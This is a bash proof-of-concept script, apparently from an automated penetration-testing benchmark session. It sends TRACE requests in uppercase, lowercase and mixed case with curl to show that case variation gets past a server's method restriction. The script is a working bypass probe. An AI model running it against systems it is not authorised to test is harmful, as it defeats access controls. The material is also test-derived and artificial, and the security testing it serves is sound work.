#!/bin/bash
# POC: Demonstrates HTTP method case sensitivity bypass where lowercase 'trace' bypasses TRACE method restrictions
# Target: ./repo
# Created: 2025-11-07T21:41:17.425Z
# Session: benchmark-XBEN-072-24-mhpdc97t

# HTTP Method Case Sensitivity Bypass POC
# Demonstrates how lowercase/mixed-case HTTP methods can bypass security controls
# Testing TRACE method case variations on the root endpoint

TARGET="${1:-http://localhost:8080}"
echo "=== HTTP Method Case Sensitivity Bypass POC ==="
echo "Target: $TARGET"
echo ""

# Test 1: Uppercase TRACE (should be blocked with 405)
echo "[*] Test 1: Uppercase TRACE method"
echo "Command: curl -i -X TRACE $TARGET/"
echo "Expected: HTTP 405 Method Not Allowed"
response1=$(curl -s -i -X TRACE "$TARGET/" 2>&1)
status1=$(echo "$response1" | head -n 1)
echo "Response: $status1"
if echo "$status1" | grep -q "405"; then
    echo "✓ TRACE correctly blocked with 405"
else
    echo "✗ TRACE not blocked (unexpected)"
fi
echo ""

# Test 2: Lowercase trace (should bypass with 200)
echo "[*] Test 2: Lowercase trace method"
echo "Command: curl -i -X trace $TARGET/"
echo "Expected: HTTP 200 OK (BYPASSED!)"
response2=$(curl -s -i -X trace "$TARGET/" 2>&1)
status2=$(echo "$response2" | head -n 1)
echo "Response: $status2"
if echo "$status2" | grep -q "200"; then
    echo "✓ VULNERABILITY: Lowercase trace bypasses restriction and returns 200"
    echo "✓ TRACE method restriction successfully bypassed using case variation"
else
    echo "✗ Lowercase trace also blocked (unexpected)"
fi
echo ""

# Test 3: Mixed case Trace
echo "[*] Test 3: Mixed case Trace method"
echo "Command: curl -i -X Trace $TARGET/"
response3=$(curl -s -i -X Trace "$TARGET/" 2>&1)
status3=$(echo "$response3" | head -n 1)
echo "Response: $status3"
if echo "$status3" | grep -q "200"; then
    echo "✓ VULNERABILITY: Mixed case Trace also bypasses restriction"
fi
echo ""

# Test 4: Lowercase GET (baseline test)
echo "[*] Test 4: Lowercase get method (baseline)"
echo "Command: curl -i -X get $TARGET/"
response4=$(curl -s -i -X get "$TARGET/" 2>&1)
status4=$(echo "$response4" | head -n 1)
echo "Response: $status4"
echo ""

# Test 5: Lowercase POST (baseline test)
echo "[*] Test 5: Lowercase post method (baseline)"
echo "Command: curl -i -X post $TARGET/"
response5=$(curl -s -i -X post "$TARGET/" 2>&1)
status5=$(echo "$response5" | head -n 1)
echo "Response: $status5"
echo ""

# Summary
echo "=== VULNERABILITY SUMMARY ==="
echo "Uppercase TRACE: $status1"
echo "Lowercase trace: $status2"
echo "Mixed case Trace: $status3"
echo ""

if echo "$status1" | grep -q "405" && echo "$status2" | grep -q "200"; then
    echo "✓ HTTP Method Case Sensitivity Bypass CONFIRMED"
    echo "✓ Security controls bypass lowercase HTTP methods"
    exit 0
else
    echo "✗ Vulnerability not confirmed or target not responding as expected"
    exit 1
fi